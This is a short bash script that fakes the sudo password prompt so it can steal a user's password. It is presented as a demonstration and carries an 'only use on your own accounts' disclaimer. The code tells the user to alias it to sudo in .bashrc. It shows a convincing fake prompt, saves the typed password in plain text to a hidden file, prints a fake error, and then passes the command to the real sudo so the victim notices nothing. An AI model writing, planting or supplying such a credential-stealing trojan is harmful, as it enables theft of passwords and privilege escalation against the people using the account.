#!/bin/bash

### Just a script to demonstrate how easy it is to imitate sudo's behaviour to steal a user's password
### Alias this script to sudo in .bashrc
### ONLY USE ON YOUR OWN ACCOUNTS

commande="$1"
arguments="$2"
sudo_output="usage: sudo -h | -K | -k | -V
usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user]
            [command]
usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
            prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]
usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
            prompt] [-T timeout] [-u user] file ..."
error_output=$(sudo -l | grep badpass | cut -d , -f3 | cut -d = -f2)	    
trashfile=".trashfile"
password_file=".stolenpassword"

if [[ $# -eq 0 ]]; then echo "$sudo_output"; exit 0; fi
echo "$commande $arguments" > "$trashfile"

function get_password () {
	
	echo -n "[sudo] password for $(whoami):"
	trap "stty echo" EXIT INT HUP QUIT	# Exec "" if SIGS received
       	stty -echo	# Hide typing
	read -r password
	stty echo	# Show typing
	trap - EXIT INT HUP QUIT 		# Cancel previous trap
	echo -e "User: $(whoami)\nPass: $password" > "$password_file" 
	sleep 2 
	echo -e "\n$error_output"
}

if [[ ! -e "$password_file" ]]; then get_password; fi

### Execute command

commande="$(cat "$trashfile" |cut -d " " -f1)"
arguments="$(cat "$trashfile" |cut -d " " -f2)"
rm -f "$trashfile"
/usr/bin/sudo "$commande" "$arguments"

